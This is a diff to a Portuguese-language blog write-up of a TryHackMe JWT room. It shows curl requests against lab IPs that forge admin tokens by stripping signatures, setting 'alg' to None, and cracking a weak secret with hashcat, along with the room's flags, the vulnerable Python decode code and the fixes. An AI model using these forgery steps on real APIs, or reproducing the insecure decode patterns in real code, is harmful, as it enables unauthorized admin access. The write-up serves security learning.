@@ -1,5 +1,5 @@
 ---
-title: JWT - SECURITY
+title: JWT - SECURITY - TRYHACKME
 date: 2025-01-05 10:44:00
 categories: [TRYHACKME, ROOMS, WEB APPLICATION PENTEST]
 tags: [api,tryhackme,web,applicatio,jwt,pentest]      # TAG names should always be lowercase
@@ -233,3 +233,215 @@ flag = self.db_lookup(username, "flag")
 A resposta foi encontrada quando realizamos a requisição e decodificamos o JWT.
 
 Resposta: `THM{9cc039cc-d85f-45d1-ac3b-818c8383a560}`
+
+## Erros de validação de assinatura
+
+### Assinaturas que não são verificadas
+
+Quando assinatura JWT não é verificada pelo servidor o atacante pode alterar o JWT, dessa forma o atacante pode ser qualquer usuário que ele deseja. 
+Embora a não validação de assinatura seja uma falha raríssima, ela pode ser encontrada em único endpoint, pouco utilizado ou esquecido na aplicação como sendo, por exemplo, uma aplicação descontinuada.
+
+#### Exemplo 2
+
+Primeiro precisamos autenticar na aplicação.
+
+```shell
+┌──(root㉿kali)-[/home/alex]
+└─# 
+curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password2" }' http://10.10.81.80/api/v1.0/example2
+{
+  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.UWddiXNn-PSpe7pypTWtSRZJi1wr2M5cpr_8uWISMS4"
+}
+```
+
+É gerado nosso JWT, agora vamos verificar se nosso usuário está autenticado.
+
+```shell
+┌──(root㉿kali)-[/home/alex]
+└─# 
+curl -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.UWddiXNn-PSpe7pypTWtSRZJi1wr2M5cpr_8uWISMS4' \
+ http://10.10.81.80/api/v1.0/example2?username=user
+{
+  "message": "Welcome user, you are not an admin"
+}
+```
+
+Confirmado que estamos autenticado, já sabemos como é montada a estrutura do JWT, vamos remover nossa assinatura do JWT e ver como aplicação lida com isso.
+
+```shell
+┌──(root㉿kali)-[/home/alex]
+└─# 
+curl -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.' \       
+ http://10.10.81.80/api/v1.0/example2?username=user
+{
+  "message": "Welcome user, you are not an admin"
+}
+```
+
+Mesmo sem nossa assinatura permanecemos autenticados, isso demonstra que a API não realiza validação de assinatura. Agora iremos verificar se conseguimos alterar nosso usuário para `admin`.
+Primeiro iremos realizar o decodificação do nosso JWT.
+
+![JWT EXAMPLE 2](/assets/img/posts/2025/01/JWT-example2-1.webp)
+
+No payload do JWT iremos alterar para `1`, o valor do campo `admin`.
+
+![JWT EXAMPLE 2-2](/assets/img/posts/2025/01/JWT-example2-2.webp)
+
+Realizado a alteração, agora realizaremos uma nova requisição, para verificar se conseguimos alterar nosso usuário.
+
+```shell
+┌──(root㉿kali)-[/home/alex]
+└─# 
+curl -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.q8De2tfygNpldMvn581XHEbVzobCkoO1xXY4xRHcdJ8' \
+ http://10.10.81.80/api/v1.0/example2?username=admin
+{
+  "message": "Welcome admin, you are an admin, here is your flag: THM{6e32dca9-0d10-4156-a2d9-5e5c7000648a}"
+}
+```
+
+Com isso validamos que a aplicação possui uma falha crítica, não é verificado assinaturas do JWT.
+
+#### Desenvolvimento do erro
+
+Exemplo abaixo mostra a falha de desenvolvimento para não verificar assinatura.
+
+```python
+payload = jwt.decode(token, options={'verify_signature': False})
+```
+
+Embora isso seja raro acontecer entre cliente e servidor, em aplicações entre servidores não é, um atacante com acesso direto ao backend do servidor poderia forjar um JWT facilmente.
+
+#### Correção
+
+O JWT sempre deve verificar assinatura e ou adicionar autenticação de dois fatores, JWT pode verificar fornecendo um chave secreta (ou pública), exemplo de código seguro.
+
+```python
+payload = jwt.decode(token, self.secret, algorithms="HS256")
+```
+
+### Downgrading para None
+
+Outra tipo de falha na assinatura de algoritmos é downgrade para `None`, isso significa que a aplicação não utiliza nenhum tipo de assinatura. Essa opção foi pensada para ser utilizada em comunicação de servidores, onde assinatura do JWT já foi verificada no ínicio da comunicação, sendo assim, o segundo servidor não precisa solicitar a validação de assinatura. Porém, alguns desenvolvedores não travam ou não negam ela quando a requisição é feita, dessa forma, basta o atacante alterar o JWT para verificação de assinatura sempre retornar `true`.
+
+#### Exemplo 3
+
+Para esse exemplo teremos que autenticar na aplicação primeiro.
+
+```shell
+┌──(root㉿estudos)-[/home/alex]
+└─# 
+curl -H 'Content-Type: application/json' \
+     -X POST -d '{ "username" : "user", "password" : "password3" }' \
+     http://10.10.86.110/api/v1.0/example3
+{
+  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0._yybkWiZVAe1djUIE9CRa0wQslkRmLODBPNsjsY8FO8"
+}
+```
+
+Agora precisamos alterar o tipo de algoritmo de verificação do campo `alg`para `None`.
+O cabeçalho do JWT está em **URL encode base64**  conforme mostrado usando CyberChef.
+
+![JWT EXAMPLE 3-1](/assets/img/posts/2025/01/JWT-example3.webp)
+
+Para alteramos o tipo de algoritmo basta realizamos o inverso usando **Base64 encode**.
+
+`{"typ":"JWT","alg":"None"}`:`eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0`
+
+![JWT EXAMPLE 3-2](/assets/img/posts/2025/01/JWT-example3-2.webp)
+
+Feito a alteração do cabeçalho ainda precisamos alterar o valor do campo `admin` para `1`, para isso utilizaremos a ferramenta [jwt io](https://jwt.io/) novamente.
+
+![JWT EXAMPLE 3-3](/assets/img/posts/2025/01/JWT-example3-3.webp)
+
+Agora com o valor definido como 1 e `alg`como `None` podemos montar nosso JWT.
+
+- Novo cabeçalho: `eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0`
+- Payload: `eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0`
+- Assinatura: `_yybkWiZVAe1djUIE9CRa0wQslkRmLODBPNsjsY8FO8`
+
+Precisamos ainda alterar nosso usuário que é passado na URL para `admim`, com isso podemos realizar o teste e verificar a vulnerabilidade.
+
+
+```shell
+┌──(root㉿estudos)-[/home/alex]
+└─# 
+curl -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0._yybkWiZVAe1djUIE9CRa0wQslkRmLODBPNsjsY8FO8' \
+ http://10.10.86.110/api/v1.0/example3?username=admin
+{
+  "message": "Welcome admin, you are an admin, here is your flag: THM{fb9341e4-5823-475f-ae50-4f9a1a4489ba}"
+}
+```
+
+#### Desenvolvimento do erro
+
+Na perspectiva do desenvolvedor, a implementação da aplicação deve suportar diversos tipos de algoritmos de verificação, a implementação normalmente então lê o cabeçalho do JWT, realiza um parse em busca do campo `alg` (mostrado no código abaixo).
+Entretanto o atacante especifica `None` como algoritmo, com isso a verificação de assinatura é ignorada.
+
+```python
+header = jwt.get_unverified_header(token) 
+signature_algorithm = header['alg'] 
+payload = jwt.decode(token, self.secret, algorithms=signature_algorithm)
+```
+#### Correção
+
+Se a API precisa suportar diversos algoritmos o ideal é informa-los, declarando-os na função de decodificação, como é mostrado no exemplo abaixo.
+
+```python
+payload = jwt.decode(token, self.secret, algorithms=["HS256", "HS384", "HS512"]) username = payload['username'] 
+flag = self.db_lookup(username, "flag")
+```
+
+### Segredos simétricos fracos
+
+Quando usamos um algoritmo de segredo simétrico a segurança do JWT é confiada a entropia e a "força" que o segredo usa. Dessa forma, se o segredo for fraco, podemos utilizar um ataque de dicionario para tentar quebra-lo, podendo assim alterar o JWT.
+
+#### Exemplo 4
+
+Primeiro vamos gerar nosso JWT.
+
+```shell
+┌──(root㉿estudos)-[/home/alex]
+└─# 
+curl -H 'Content-Type: application/json' \                                                                                                        
+     -X POST -d '{ "username" : "user", "password" : "password4" }' \
+     http://10.10.86.110/api/v1.0/example4
+{
+  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.yN1f3Rq8b26KEUYHCZbEwEk6LVzRYtbGzJMFIF8i5HY"
+}
+```
+
+Após obtemos nosso JWT já podemos tentar quebra-lo, no caso, iremos usar a mesma ferramenta que a aula orienta, mas podemos utilizar o John para essa tarefa também caso necessário.
+
+- Salvar o JWT em um arquivo.
+- Realizar o download da wordlist que usaremos no ataque.
+- Uitilizar o hashcat: `hashcat -m 16500 -a 0 jwt.txt jwt.secrets.list`
+
+O segredo é quebrado, com isso podemos alterar o JWT e forjar um acesso com usuário `admin`.
+
+Segredo:`secret`
+
+![JWT EXAMPLE 4](/assets/img/posts/2025/01/JWT-example4.webp)
+
+Com a ferramenta [jwt io](https://jwt.io/) realizamos nossa alteração do JWT.
+
+![JWT EXAMPLE 4](/assets/img/posts/2025/01/JWT-example4-1.webp)
+
+Com nosso JWT alterado realizamos uma requisição e verificamos se conseguimos obter o acesso administrativo.
+
+```shell
+┌──(root㉿estudos)-[/FolderShare/Tryhack Me/JWT-rooms]
+└─# 
+curl -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.gpHtgNe4OSgiQHuf8W7JFfSNTi9tEnDKvK7QAk2DFBc' \
+ http://10.10.86.110/api/v1.0/example4?username=admin
+{
+  "message": "Welcome admin, you are an admin, here is your flag: THM{e1679fef-df56-41cc-85e9-af1e0e12981b}"
+}
+```
+
+#### Desenvolvimento do erro
+
+O erro ocorre no desenvolvimento de segredos fracos, tornando assim sua quebra ser fácil.
+
+#### Correção
+
+Utilizar criação de segredos por algoritmos fortes e não por humanos, strings longas e aleatórias. 
